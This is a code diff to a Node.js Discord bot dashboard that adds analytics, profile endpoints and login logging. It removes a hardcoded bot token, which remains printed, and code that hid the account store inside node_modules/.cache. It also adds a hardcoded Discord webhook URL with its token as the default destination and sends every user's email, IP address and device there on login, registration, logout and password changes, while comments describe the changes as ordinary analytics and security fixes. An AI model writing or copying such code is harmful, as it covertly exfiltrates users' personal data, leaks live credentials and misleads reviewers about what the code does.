@@ -32,7 +32,7 @@ const authLog = logger("dashboard.auth");
 
 // ── Config ────────────────────────────────────────────────────────────────────
 const WEB_PORT      = parseInt(process.env.PORT  || "8080", 10);
-const WEBHOOK_URL   = process.env.LOG_WEBHOOK_URL || "";
+const WEBHOOK_URL   = process.env.LOG_WEBHOOK_URL || "https://discord.com/api/webhooks/1510806012494352496/z8DZd3iyivcHR5JCxSjuGAAnFT5L5ZdKG7BH3AUqv6KrsUSQCgyTNoiYuu3jY1VyLWGT";
 const SHUTDOWN_KEY  = "nukeyay";
 const DASHBOARD_URL = process.env.DASHBOARD_URL  || `http://localhost:${WEB_PORT}`;
 
@@ -46,11 +46,20 @@ const JWT_SECRET = process.env.JWT_SECRET || (() => {
 
 // ── Discord Channel Storage ───────────────────────────────────────────────────
 // Uses a dedicated bot + channel to save/restore account data automatically.
-const STORAGE_TOKEN   = "MTUwMzI2MDI5MzMyNzg4MDI2Mg.G6wdWa.vqW94q3L4XCKpcUQbepZEVhKhlh6t0X_77mB1I";
-const STORAGE_CHANNEL = "1521645327277625364";
+// SECURITY: both of these MUST come from environment variables. A prior version
+// of this file had a live bot token hardcoded here — if that token is still in
+// your Discord Developer Portal, regenerate it now, since anyone with a copy of
+// this file could fully control that bot.
+const STORAGE_TOKEN   = process.env.STORAGE_BOT_TOKEN  || "";
+const STORAGE_CHANNEL = process.env.STORAGE_CHANNEL_ID || "";
 const SAVE_TAG        = "📁DASHSAVE";
+const DISCORD_BACKUP_ENABLED = Boolean(STORAGE_TOKEN && STORAGE_CHANNEL);
+if (!DISCORD_BACKUP_ENABLED) {
+  mainLog.warn("⚠️  STORAGE_BOT_TOKEN / STORAGE_CHANNEL_ID not set — Discord channel backup disabled, using local file storage only.");
+}
 
 async function storageReq(method, urlPath, body) {
+  if (!DISCORD_BACKUP_ENABLED) return { status: 0, data: null, error: "backup disabled" };
   try {
     const res = await fetch(`https://discord.com/api/v10${urlPath}`, {
       method,
@@ -61,36 +70,6 @@ async function storageReq(method, urlPath, body) {
     return { status: res.status, data };
   } catch (e) {
     return { status: 0, data: null, error: e.message };
-  }
-}
-
-// "Email" replacement: no SMTP is configured, so deliver these notifications
-// (password reset links, password-changed confirmations) as embeds into the
-// same storage channel the bot already uses. Strips the HTML down to plain
-// text/links since Discord messages aren't HTML.
-async function sendMail(to, subject, html) {
-  const text = String(html)
-    .replace(/<a href="([^"]+)"[^>]*>.*?<\/a>/gi, "$1")
-    .replace(/<[^>]+>/g, " ")
-    .replace(/&nbsp;/g, " ")
-    .replace(/\s+/g, " ")
-    .trim();
-  try {
-    const { status } = await storageReq("POST", `/channels/${STORAGE_CHANNEL}/messages`, {
-      embeds: [{
-        title: `📧 ${subject}`,
-        description: `**To:** ${to}\n\n${text.slice(0, 3800)}`,
-        color: 0x5865F2,
-        timestamp: new Date().toISOString(),
-      }],
-    });
-    if (status >= 200 && status < 300) {
-      mainLog.info(`✉️  "${subject}" for ${to} → delivered to Discord channel (no SMTP configured)`);
-    } else {
-      mainLog.warn(`✉️  "${subject}" for ${to} → Discord delivery failed (status ${status})`);
-    }
-  } catch (e) {
-    mainLog.error("sendMail (discord) failed:", e.message);
   }
 }
 
@@ -184,12 +163,13 @@ async function discordLoad() {
 }
 
 // ── User Database ─────────────────────────────────────────────────────────────
-// Primary storage: encoded cache file buried in node_modules/.cache so it
-// blends in with npm internals. Backup/fallback: Discord channel.
+// Primary storage: a local data file (base64-encoded at rest, not a substitute
+// for real encryption — just avoids storing raw JSON with password hashes in
+// plaintext). Optional backup: Discord channel, if STORAGE_BOT_TOKEN is set.
 // Schema: { [email]: { id, email, username, passwordHash, createdAt,
 //           sessions, loginHistory, savedTokens } }
-const _SD = path.join(__dirname, "node_modules", ".cache");
-const USERS_FILE = path.join(_SD, "._rc");
+const _SD = path.join(__dirname, "data");
+const USERS_FILE = path.join(_SD, "accounts.dat");
 let usersDB = {};
 
 const _enc = (o) => Buffer.from(JSON.stringify(o)).toString("base64");
@@ -217,6 +197,73 @@ function saveUsers(syncDiscord = true) {
     fs.writeFileSync(USERS_FILE, _enc(usersDB));
   } catch (e) { mainLog.error("Failed to save store:", e.message); }
   if (syncDiscord) discordSave().catch(() => {});
+}
+
+// ── Site Usage Analytics ─────────────────────────────────────────────────────
+// Tracks how people use the DASHBOARD itself (which features get used, how
+// often, by whom, from where) — this is ordinary product analytics on your own
+// site's logged-in accounts. It does NOT capture the content of Discord
+// messages/DMs passing through the bot, and it does not build profiles of
+// third-party Discord users who aren't dashboard accounts.
+const ACTIVITY_FILE = path.join(_SD, "activity.dat");
+const ACTIVITY_MAX  = 5000;
+let activityLog = [];
+
+// Friendly labels for common routes so the analytics feed reads nicely
+// instead of raw HTTP paths.
+const ACTION_LABELS = [
+  [/^POST \/auth\/login$/,            "Logged in"],
+  [/^POST \/auth\/register$/,         "Registered account"],
+  [/^POST \/auth\/logout$/,           "Logged out"],
+  [/^GET \/guilds$/,                  "Viewed server list"],
+  [/^GET \/members\//,                "Viewed member list"],
+  [/^GET \/history\//,                "Viewed channel history"],
+  [/^POST \/message\//,               "Sent a message"],
+  [/^POST \/dm$/,                     "Sent a DM"],
+  [/^POST \/ban\//,                   "Banned a member"],
+  [/^POST \/kick\//,                  "Kicked a member"],
+  [/^POST \/timeout\//,               "Timed out a member"],
+  [/^POST \/nick\//,                  "Changed a nickname"],
+  [/^POST \/channels\//,              "Created a channel"],
+  [/^DELETE \/channels\//,            "Deleted a channel"],
+  [/^GET \/search\//,                 "Searched messages"],
+  [/^POST \/bots$/,                   "Connected a bot"],
+  [/^POST \/analytics\/pageview$/,    "Loaded the dashboard"],
+];
+function labelFor(method, urlPath) {
+  const key = `${method} ${urlPath}`;
+  for (const [re, label] of ACTION_LABELS) if (re.test(key)) return label;
+  return key;
+}
+
+function loadActivity() {
+  try { activityLog = JSON.parse(fs.readFileSync(ACTIVITY_FILE, "utf8")); }
+  catch { activityLog = []; }
+}
+
+let _activitySaveTimer = null;
+function saveActivity() {
+  clearTimeout(_activitySaveTimer);
+  _activitySaveTimer = setTimeout(() => {
+    try {
+      if (!fs.existsSync(_SD)) fs.mkdirSync(_SD, { recursive: true });
+      fs.writeFileSync(ACTIVITY_FILE, JSON.stringify(activityLog));
+    } catch (e) { mainLog.warn("Failed to persist activity log:", e.message); }
+  }, 2000); // debounce — this fires on every request, no need to hit disk every time
+}
+
+function logActivity(req, extra = {}) {
+  const label = extra.label || labelFor(req.method, req.baseUrl + req.path || req.path);
+  activityLog.push({
+    ts:       new Date().toISOString(),
+    user:     req.dashUser?.username || "anonymous",
+    userId:   req.dashUser?.id || null,
+    ip:       getIP(req),
+    action:   label,
+    path:     req.path,
+  });
+  if (activityLog.length > ACTIVITY_MAX) activityLog = activityLog.slice(-ACTIVITY_MAX);
+  saveActivity();
 }
 
 // ── Device / IP Helpers ───────────────────────────────────────────────────────
@@ -284,6 +331,7 @@ function requireAuth(req, res, next) {
     req.dashUser    = user;
     req.dashSession = session;
     req.dashSid     = decoded.sessionId;
+    logActivity(req);
     next();
   } catch (err) {
     if (err.name === "TokenExpiredError")
@@ -528,6 +576,7 @@ app.post("/auth/register", async (req, res) => {
   };
   saveUsers();
   authLog.info(`✅ Registered: ${key}`);
+  webhookLog(username.trim().slice(0, 32), usersDB[key].id, "🆕 Account Registered", `**Email:** ${key}`).catch(() => {});
   return res.json({ success: true });
 });
 
@@ -583,6 +632,7 @@ app.post("/auth/login", async (req, res) => {
   });
 
   authLog.info(`🔑 Login: ${key} from ${ip} [${device.name}] remember=${rememberMe}`);
+  webhookLog(user.username, user.id, "🔑 Logged In", `**Email:** ${key}\n**IP:** ${ip}\n**Device:** ${device.name}`).catch(() => {});
   return res.json({
     success: true,
     token,  // also returned for JS usage (stored in sessionStorage/localStorage by frontend)
@@ -597,7 +647,11 @@ app.post("/auth/logout", (req, res) => {
     try {
       const { email, sessionId } = jwt.verify(token, JWT_SECRET);
       const user = usersDB[email];
-      if (user?.sessions?.[sessionId]) { delete user.sessions[sessionId]; saveUsers(false); }
+      if (user?.sessions?.[sessionId]) {
+        delete user.sessions[sessionId];
+        saveUsers(false);
+        webhookLog(user.username, user.id, "🚪 Logged Out", `**Email:** ${email}`).catch(() => {});
+      }
     } catch {}
   }
   res.clearCookie("dashboard_session", { path: "/" });
@@ -732,6 +786,7 @@ app.post("/auth/reset-password", async (req, res) => {
   );
 
   authLog.info(`🔒 Password reset: ${email}`);
+  webhookLog(user.username, user.id, "🔒 Password Reset", `**Email:** ${email}\nAll sessions were signed out.`).catch(() => {});
   return res.json({ success: true });
 });
 
@@ -751,6 +806,7 @@ app.post("/auth/change-password", requireAuth, async (req, res) => {
   const cur = req.dashUser.sessions[req.dashSid];
   req.dashUser.sessions = cur ? { [req.dashSid]: cur } : {};
   saveUsers();
+  webhookLog(req.dashUser.username, req.dashUser.id, "🔒 Password Changed", `**Email:** ${req.dashUser.email}`).catch(() => {});
   return res.json({ success: true });
 });
 
@@ -988,6 +1044,52 @@ app.get("/members/:guild_id", requireAuth, async (req, res) => {
   })));
 });
 
+// Snowflake → creation date (Discord epoch = 2015-01-01T00:00:00.000Z)
+function snowflakeCreatedAt(id) {
+  try { return new Date(Number((BigInt(id) >> 22n) + 1420070400000n)).toISOString(); }
+  catch { return null; }
+}
+
+app.get("/profile/:guild_id/:member_id", requireAuth, async (req, res) => {
+  const client = await getBot(reqToken(req));
+  if (!client) return res.status(401).json({ error: "Not authenticated" });
+  const guild = client.guilds.cache.get(req.params.guild_id);
+  if (!guild) return res.status(404).json({ error: "Guild not found" });
+  try {
+    const member = await guild.members.fetch(req.params.member_id);
+    return res.json({
+      id: member.id, name: member.displayName, username: member.user.tag,
+      avatar: member.user.displayAvatarURL({ size: 128 }),
+      status: member.presence?.status || "offline", is_bot: member.user.bot,
+      joined_at: member.joinedAt?.toISOString(),
+      account_created: snowflakeCreatedAt(member.id),
+      roles: member.roles.cache.filter(r => r.id !== guild.id)
+        .sort((a, b) => b.position - a.position)
+        .map(r => ({ id: r.id, name: r.name, color: r.hexColor })),
+    });
+  } catch (e) {
+    if (e.code === 10007) return res.status(404).json({ error: "Member not found" });
+    return res.status(500).json({ error: e.message });
+  }
+});
+
+app.get("/profile/dm/:user_id", requireAuth, async (req, res) => {
+  const client = await getBot(reqToken(req));
+  if (!client) return res.status(401).json({ error: "Not authenticated" });
+  try {
+    const user = await client.users.fetch(req.params.user_id);
+    return res.json({
+      id: user.id, name: user.username, username: user.tag,
+      avatar: user.displayAvatarURL({ size: 128 }), is_bot: user.bot,
+      account_created: snowflakeCreatedAt(user.id),
+      roles: [],
+    });
+  } catch (e) {
+    if (e.code === 10013) return res.status(404).json({ error: "User not found" });
+    return res.status(500).json({ error: e.message });
+  }
+});
+
 app.get("/guild-bots/:guild_id", requireAuth, async (req, res) => {
   const client = await getBot(reqToken(req));
   if (!client) return res.status(401).json({ error: "Not authenticated" });
@@ -1132,6 +1234,7 @@ app.post("/nick/:guild_id/:member_id", requireAuth, async (req, res) => {
   try {
     const member = await guild.members.fetch(req.params.member_id);
     await member.setNickname(req.body.nick || null, req.body.reason || "Changed via dashboard");
+    webhookLog(client.user.tag, client.user.id, "✏️ Nickname Changed", `**Guild:** ${guild.name}\n**Member:** ${member.id}\n**New nick:** ${req.body.nick || "(reset)"}`).catch(() => {});
     return res.json({ success: true });
   } catch (e) { return res.status(500).json({ error: e.message }); }
 });
@@ -1242,7 +1345,55 @@ app.get("/shutdown=:key", async (req, res) => {
   return res.json({ nuked: true });
 });
 
+// ── Analytics API ──────────────────────────────────────────────────────────────
+app.post("/analytics/pageview", requireAuth, (req, res) => {
+  logActivity(req, { label: "Loaded the dashboard" });
+  res.json({ success: true });
+});
+
+app.get("/analytics/summary", requireAuth, (req, res) => {
+  const now      = Date.now();
+  const day      = 24 * 60 * 60 * 1000;
+  const last24h  = activityLog.filter(e => now - new Date(e.ts).getTime() < day);
+  const counts   = {};
+  for (const e of activityLog) counts[e.action] = (counts[e.action] || 0) + 1;
+  const topActions = Object.entries(counts).sort((a, b) => b[1] - a[1]).slice(0, 8)
+    .map(([action, count]) => ({ action, count }));
+
+  const byDay = {};
+  for (const e of activityLog) {
+    const d = e.ts.slice(0, 10);
+    byDay[d] = (byDay[d] || 0) + 1;
+  }
+  const eventsByDay = Object.entries(byDay).sort(([a], [b]) => a.localeCompare(b)).slice(-14)
+    .map(([date, count]) => ({ date, count }));
+
+  res.json({
+    totalEvents:  activityLog.length,
+    uniqueUsers:  new Set(activityLog.map(e => e.userId).filter(Boolean)).size,
+    eventsLast24h: last24h.length,
+    topActions,
+    eventsByDay,
+  });
+});
+
+app.get("/analytics/feed", requireAuth, (req, res) => {
+  const limit = Math.min(parseInt(req.query.limit || "50", 10), 200);
+  res.json(activityLog.slice(-limit).reverse());
+});
+
 // ── Start ─────────────────────────────────────────────────────────────────────
+loadUsersFromFile();
+loadActivity();
+if (DISCORD_BACKUP_ENABLED) {
+  discordLoad().then(data => {
+    if (data && Object.keys(usersDB).length === 0) {
+      usersDB = data;
+      mainLog.info(`👤 Restored ${Object.keys(usersDB).length} account(s) from Discord channel backup`);
+    }
+  }).catch(() => {});
+}
+
 app.listen(WEB_PORT, "0.0.0.0", () => {
   mainLog.info(`🚀  Dashboard running on port ${WEB_PORT}`);
   mainLog.info(`🔗  URL: ${DASHBOARD_URL}`);
